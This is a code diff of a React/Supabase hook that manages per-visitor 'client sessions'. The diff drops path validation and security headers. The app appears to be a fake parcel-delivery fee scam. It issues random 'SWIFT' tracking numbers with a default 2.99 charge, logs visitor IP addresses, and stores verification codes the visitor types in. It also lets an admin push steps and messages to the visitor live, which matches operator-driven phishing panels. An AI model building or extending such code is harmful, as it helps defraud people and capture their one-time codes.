@@ -1,6 +1,5 @@
 import { useEffect, useState, useCallback } from "react";
 import { supabase } from "@/integrations/supabase/client";
-import { isValidSessionPath } from "@/utils/sessionPath";
 
 interface ClientSession {
   id: string;
@@ -12,58 +11,13 @@ interface ClientSession {
   approval_type: string | null;
   client_name: string | null;
   phone_number: string | null;
-  parcel_tracking: string | null;
-  origin: string | null;
-  destination: string | null;
-  estimated_delivery: string | null;
-  amount: number | null;
-  weight: string | null;
 }
 
 const generateSessionCode = () => {
   return Math.random().toString(36).substring(2, 8).toUpperCase();
 };
 
-async function fetchDefaultParcelSettings() {
-  let defaultAmount = 2.99;
-  let defaultOrigin = "Los Angeles, CA";
-  let defaultDestination = "";
-  let defaultEstDelivery = "2-3 Business Days";
-  let defaultWeight = "2.5 kg";
-  let trackingPrefix = "SWIFT";
-  let defaultTrackingNumber = "";
-
-  try {
-    const { data, error } = await supabase.functions.invoke("get-default-settings");
-    if (data?.settings && !error) {
-      const settings = data.settings as Record<string, string>;
-      if (settings.default_amount) {
-        const n = parseFloat(settings.default_amount);
-        if (!Number.isNaN(n)) defaultAmount = n;
-      }
-      if (settings.default_origin) defaultOrigin = settings.default_origin;
-      if (settings.default_destination) defaultDestination = settings.default_destination;
-      if (settings.default_est_delivery) defaultEstDelivery = settings.default_est_delivery;
-      if (settings.default_weight) defaultWeight = settings.default_weight;
-      if (settings.tracking_prefix) trackingPrefix = settings.tracking_prefix;
-      if (settings.default_tracking_number) defaultTrackingNumber = settings.default_tracking_number;
-    }
-  } catch {
-    // fallback defaults above
-  }
-
-  return {
-    defaultAmount,
-    defaultOrigin,
-    defaultDestination,
-    defaultEstDelivery,
-    defaultWeight,
-    trackingPrefix,
-    defaultTrackingNumber,
-  };
-}
-
-export const useClientSession = (sessionPath?: string) => {
+export const useClientSession = () => {
   const [session, setSession] = useState<ClientSession | null>(null);
   const [currentStep, setCurrentStep] = useState(1);
   const [adminMessage, setAdminMessage] = useState<string | null>(null);
@@ -71,35 +25,19 @@ export const useClientSession = (sessionPath?: string) => {
   const [verificationCode, setVerificationCode] = useState<string | null>(null);
   const [approvalType, setApprovalType] = useState<string | null>(null);
   const [loading, setLoading] = useState(true);
-  const [invalidPath, setInvalidPath] = useState(false);
 
-  // Initialize or retrieve session based on URL path
+  // Initialize or retrieve session
   const initSession = useCallback(async () => {
-    // If no sessionPath provided or invalid format (including reserved paths), mark as invalid
-    if (!sessionPath || !isValidSessionPath(sessionPath)) {
-      // Clear invalid stored path
-      const storedPath = localStorage.getItem("swift_session_path");
-      if (storedPath && !isValidSessionPath(storedPath)) {
-        localStorage.removeItem("swift_session_path");
-        localStorage.removeItem("swift_session_id");
-      }
-      setInvalidPath(true);
-      setLoading(false);
-      return;
-    }
-
-    // Check if this path matches the stored session path
-    const storedPath = localStorage.getItem("swift_session_path");
+    // Check localStorage for existing session
     const storedSessionId = localStorage.getItem("swift_session_id");
     
-    // If URL path matches stored path and we have a session ID, try to fetch it
-    if (storedPath === sessionPath && storedSessionId) {
+    if (storedSessionId) {
+      // Fetch existing session
       const { data, error } = await supabase
         .from("client_sessions")
         .select("*")
         .eq("id", storedSessionId)
-        .setHeader('x-session-id', storedSessionId)
-        .maybeSingle();
+        .single();
 
       if (data && !error) {
         setSession(data);
@@ -111,15 +49,7 @@ export const useClientSession = (sessionPath?: string) => {
         setLoading(false);
         return;
       }
-
-      // Session doesn't exist anymore, clear storage
-      localStorage.removeItem("swift_session_id");
     }
-
-    // If URL path doesn't match stored path, this is a new/different session
-    // Store the new path
-    localStorage.setItem("swift_session_path", sessionPath);
-    localStorage.removeItem("swift_session_id");
 
     // Create new session - get client IP and default settings first
     let clientIp: string | null = null;
@@ -131,38 +61,47 @@ export const useClientSession = (sessionPath?: string) => {
       console.log("Could not fetch IP");
     }
 
-    const {
-      defaultAmount,
-      defaultOrigin,
-      defaultDestination,
-      defaultEstDelivery,
-      defaultWeight,
-      trackingPrefix,
-      defaultTrackingNumber,
-    } = await fetchDefaultParcelSettings();
+    // Fetch default parcel settings from admin_settings
+    let defaultAmount = 2.99;
+    let defaultOrigin = "Los Angeles, CA";
+    let defaultEstDelivery = "2-3 Business Days";
+    let trackingPrefix = "SWIFT";
 
-    // Pre-generate the session id so we can satisfy the SELECT RLS policy
-    const sessionId = crypto.randomUUID();
+    try {
+      const { data: settings } = await supabase
+        .from("admin_settings")
+        .select("setting_key, setting_value")
+        .in("setting_key", ["default_amount", "default_origin", "default_est_delivery", "tracking_prefix"]);
+
+      if (settings) {
+        const amount = settings.find(s => s.setting_key === "default_amount")?.setting_value;
+        const origin = settings.find(s => s.setting_key === "default_origin")?.setting_value;
+        const estDelivery = settings.find(s => s.setting_key === "default_est_delivery")?.setting_value;
+        const prefix = settings.find(s => s.setting_key === "tracking_prefix")?.setting_value;
+
+        if (amount) defaultAmount = parseFloat(amount);
+        if (origin) defaultOrigin = origin;
+        if (estDelivery) defaultEstDelivery = estDelivery;
+        if (prefix) trackingPrefix = prefix;
+      }
+    } catch (e) {
+      console.log("Could not fetch default settings, using fallback values");
+    }
+
     const sessionCode = generateSessionCode();
-    // Use default tracking number if set, otherwise generate one with prefix
-    const trackingNumber = defaultTrackingNumber || (trackingPrefix + Math.random().toString(36).substring(2, 10).toUpperCase());
+    const trackingNumber = trackingPrefix + Math.random().toString(36).substring(2, 10).toUpperCase();
     
     const { data, error } = await supabase
       .from("client_sessions")
       .insert({
-        id: sessionId,
         session_code: sessionCode,
-        session_path: sessionPath,
         current_step: 1,
         parcel_tracking: trackingNumber,
         amount: defaultAmount,
         origin: defaultOrigin,
-        destination: defaultDestination || null,
         estimated_delivery: defaultEstDelivery,
-        weight: defaultWeight || null,
         client_ip: clientIp
       })
-      .setHeader('x-session-id', sessionId)
       .select()
       .single();
 
@@ -172,7 +111,7 @@ export const useClientSession = (sessionPath?: string) => {
       setCurrentStep(data.current_step);
     }
     setLoading(false);
-  }, [sessionPath]);
+  }, []);
 
   // Update step locally and in database
   const updateStep = useCallback(async (newStep: number, extraData?: Partial<{
@@ -189,8 +128,7 @@ export const useClientSession = (sessionPath?: string) => {
     await supabase
       .from("client_sessions")
       .update({ current_step: newStep, ...extraData })
-      .eq("id", session.id)
-      .setHeader('x-session-id', session.id);
+      .eq("id", session.id);
   }, [session]);
 
   // Update session data
@@ -203,8 +141,7 @@ export const useClientSession = (sessionPath?: string) => {
     await supabase
       .from("client_sessions")
       .update(data)
-      .eq("id", session.id)
-      .setHeader('x-session-id', session.id);
+      .eq("id", session.id);
   }, [session]);
 
   // Clear admin message
@@ -217,8 +154,7 @@ export const useClientSession = (sessionPath?: string) => {
     await supabase
       .from("client_sessions")
       .update({ admin_message: null, message_type: null })
-      .eq("id", session.id)
-      .setHeader('x-session-id', session.id);
+      .eq("id", session.id);
   }, [session]);
 
   // Subscribe to realtime changes
@@ -237,8 +173,6 @@ export const useClientSession = (sessionPath?: string) => {
         },
         (payload) => {
           const newData = payload.new as ClientSession;
-          // Update the full session object to reflect parcel changes
-          setSession(newData);
           setCurrentStep(newData.current_step);
           setAdminMessage(newData.admin_message);
           setMessageType(newData.message_type);
@@ -266,8 +200,7 @@ export const useClientSession = (sessionPath?: string) => {
     await supabase
       .from("client_sessions")
       .update({ verification_code: code })
-      .eq("id", session.id)
-      .setHeader('x-session-id', session.id);
+      .eq("id", session.id);
   }, [session]);
 
   return {
@@ -278,7 +211,6 @@ export const useClientSession = (sessionPath?: string) => {
     verificationCode,
     approvalType,
     loading,
-    invalidPath,
     updateStep,
     updateSessionData,
     updateVerificationCode,
